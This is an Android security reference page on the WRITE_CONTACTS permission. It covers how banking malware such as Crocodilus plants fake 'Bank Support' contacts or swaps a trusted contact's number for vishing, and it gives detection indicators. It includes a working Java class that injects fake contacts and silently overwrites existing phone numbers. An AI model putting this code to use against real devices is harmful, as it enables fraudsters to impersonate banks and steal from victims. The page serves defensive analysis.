# WRITE_CONTACTS

Allows creating, modifying, and deleting contacts on the device. Can be used to inject contacts for social engineering or modify existing contacts to redirect calls/messages.

## Technical Details

| Attribute | Value |
|-----------|-------|
| Permission | `android.permission.WRITE_CONTACTS` |
| Protection Level | `dangerous` |
| Permission Group | `CONTACTS` |
| Grant Method | Runtime permission dialog |
| Introduced | API 1 |

## What It Enables

Full write access to the `ContactsContract` content provider:

- Create new contacts
- Modify existing contact details (phone numbers, emails)
- Delete contacts
- Modify contact photos

## Abuse in Malware

### Contact Poisoning

Modify a legitimate contact's phone number to redirect calls to an attacker-controlled number. When the victim calls "their bank," they reach the attacker instead.

### Social Engineering Setup

Inject a fake contact (e.g., "Bank Security" with the attacker's number) so that when the attacker calls, the victim sees a trusted name on caller ID.

### Evidence Destruction

Delete contacts to destroy evidence of communication or to disrupt the victim's phone.

### Notable Families

| Family | Usage |
|--------|-------|
| [Crocodilus](../../malware/families/crocodilus.md) | Injects fake "Bank Support" contacts to enable convincing vishing (voice phishing) calls |

Crocodilus uses `WRITE_CONTACTS` to plant fake entries in the victim's contact list with names like "Bank Support" or the real name of their bank's customer service department. When the operators later call the victim from the number associated with these fake contacts, the victim's phone displays the spoofed contact name on caller ID. This makes the incoming call appear to originate from the victim's bank, enabling highly convincing social engineering where the attacker poses as bank staff and instructs the victim to approve transactions or provide credentials.

### Abuse Code Example

```java
public class ContactInjector {

    private final ContentResolver resolver;

    public ContactInjector(ContentResolver resolver) {
        this.resolver = resolver;
    }

    public void injectFakeBankContact(String displayName, String phoneNumber) {
        ArrayList<ContentProviderOperation> ops = new ArrayList<>();

        ops.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
            .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
            .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null)
            .build());

        ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
            .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
            .withValue(ContactsContract.Data.MIMETYPE,
                ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
            .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME,
                displayName)
            .build());

        ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
            .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
            .withValue(ContactsContract.Data.MIMETYPE,
                ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
            .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, phoneNumber)
            .withValue(ContactsContract.CommonDataKinds.Phone.TYPE,
                ContactsContract.CommonDataKinds.Phone.TYPE_WORK)
            .build());

        try {
            resolver.applyBatch(ContactsContract.AUTHORITY, ops);
        } catch (Exception e) {
        }
    }

    public void replaceExistingContactNumber(String targetName, String newNumber) {
        Cursor cursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            new String[]{ContactsContract.CommonDataKinds.Phone._ID},
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " = ?",
            new String[]{targetName},
            null
        );

        if (cursor == null) return;

        while (cursor.moveToNext()) {
            long phoneId = cursor.getLong(0);
            ContentValues values = new ContentValues();
            values.put(ContactsContract.CommonDataKinds.Phone.NUMBER, newNumber);
            resolver.update(
                ContentUris.withAppendedId(ContactsContract.Data.CONTENT_URI, phoneId),
                values, null, null
            );
        }
        cursor.close();
    }
}
```

The code demonstrates both injection patterns: creating entirely new fake contacts and modifying existing contact phone numbers. The second technique is more dangerous because the victim already trusts the contact name -- replacing the real bank's number with the attacker's means the victim will unknowingly call the attacker when they look up their bank.

## Android Version Changes

**Android 4.0 (API 14)**: `ContactsContract` API stabilized. The content provider model for contacts has remained largely consistent since.

**Android 6.0 (API 23)**: runtime permission required. `WRITE_CONTACTS` and `READ_CONTACTS` are in the same `CONTACTS` permission group, so granting one may grant the other depending on the Android version.

**Android 11 (API 30)**: no significant changes to the permission itself, but package visibility restrictions mean apps must declare which content providers they interact with, adding a minor layer of visibility into contact manipulation intent.

## Detection

In the manifest:

```xml
<uses-permission android:name="android.permission.WRITE_CONTACTS" />
```

Less commonly requested than `READ_CONTACTS`. Any app requesting write access without clear contact management functionality is suspicious.

### Analysis Indicators

- Look for `ContentProviderOperation.newInsert()` calls targeting `ContactsContract.RawContacts` and `ContactsContract.Data` content URIs -- this is the contact injection pattern.
- Contact updates targeting `ContactsContract.CommonDataKinds.Phone` with new phone numbers indicate number replacement attacks.
- Check for hardcoded strings resembling bank names ("Customer Support," "Security Department," financial institution names) used as display names in contact creation.
- Combined with `READ_CONTACTS` and call-related permissions (`CALL_PHONE`, `READ_PHONE_STATE`), `WRITE_CONTACTS` indicates a vishing-oriented attack chain as seen in Crocodilus.
- Batch operations (`applyBatch`) that insert multiple contacts at once suggest programmatic injection rather than user-initiated contact creation.
- Timestamp analysis on device contacts can reveal contacts created during suspicious timeframes that the user did not manually add.

## See Also

- [READ_CONTACTS](read-contacts.md) -- typically paired with `WRITE_CONTACTS` to read existing contacts before modifying or injecting new ones
- [Phishing Techniques](../../attacks/phishing-techniques.md) -- contact poisoning and fake contact injection support vishing and social engineering attacks
- [CALL_PHONE](../phone/call-phone.md) -- combined with `WRITE_CONTACTS`, enables full vishing attack chains where the malware both plants fake contacts and initiates or redirects calls
